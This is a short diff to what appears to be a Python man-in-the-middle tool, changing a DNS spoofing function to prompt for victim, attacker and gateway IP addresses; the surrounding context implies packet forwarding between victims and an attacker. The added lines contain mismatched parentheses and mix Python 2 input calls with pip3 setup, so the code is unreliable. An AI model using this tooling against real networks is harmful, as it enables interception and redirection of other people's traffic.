@@ -108,7 +108,15 @@ def forward_packet(packet, macVictimList, ipVictimList, macAttacker):
 
 # pip3 install scapy
 # pip3 install netfilterqueue 
-def dns_spoof(ipVictim, ipAttacker, ipGatewayRouter):
+def dns_spoof():
+    # The user needs to input the ipVictim
+    ipVictim = raw_input("The IP address of the victim: "))
+
+    # The user needs to input the ipAttacker
+    ipAttacker = raw_input("The IP address of the attacker: "))
+
+    # The user needs to input the ipGatewayRouter
+    ipGatewayRouter = raw_input("The IP address of the gateway router: "))
 
     class DnsSnoof:
         def __init__(self, dns_hosts, queueNum):
